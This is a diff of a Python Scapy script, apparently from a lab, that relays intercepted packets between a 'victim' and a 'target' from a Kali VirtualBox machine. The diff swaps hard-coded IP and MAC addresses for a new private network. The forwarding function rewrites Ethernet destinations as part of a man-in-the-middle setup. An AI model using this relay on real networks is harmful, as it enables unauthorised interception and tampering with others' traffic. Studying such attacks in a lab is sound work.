@@ -6,16 +6,17 @@ import sys
 iface = "eth0"
 filter = "ip"
 #victim in this case is the initiator
-VICTIM_IP = "172.16.24.109"
-MY_IP = "172.16.24.91"
+VICTIM_IP = "192.168.1.190"
+#The IP of this Kali Virtualbox system
+MY_IP = "192.168.1.143"
 # gateway is the target
-GATEWAY_IP = "172.16.24.188"
-#VICTIM_MAC = "### don't want so show###"
+TARGET_IP = "192.168.1.191"
+#VICTIM_MAC = "### This is the MAC of this Kali virtual box - since its virtual it shouldn't change.###"
 MY_MAC = "08:00:27:f2:ee:7c"
 #target mac address
-GATEWAY_MAC = "08:00:27:60:74:b2"
+TARGET_MAC = "08:00:27:da:24:ee"
 #initiator mac address
-VICTIM_MAC = "08:00:27:b9:c9:b9" 
+VICTIM_MAC = "08:00:27:26:ba:94" 
   
 def parse_to_hex(packet):
     # lines below are to redirect hexdump to a file so that we can use in the python script again
@@ -36,9 +37,9 @@ def parse_to_hex(packet):
     return packet_hex
 
 def handle_packet(packet):
-    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
+    if (packet[IP].dst == TARGET_IP) and (packet[Ether].dst == MY_MAC):
         # we change the packet destination to the target machine
-        packet[Ether].dst = GATEWAY_MAC
+        packet[Ether].dst = TARGET_MAC
         packet_hex = parse_to_hex(packet)
         print packet_hex + "----"
         # packets with destination to the target machine are just sent
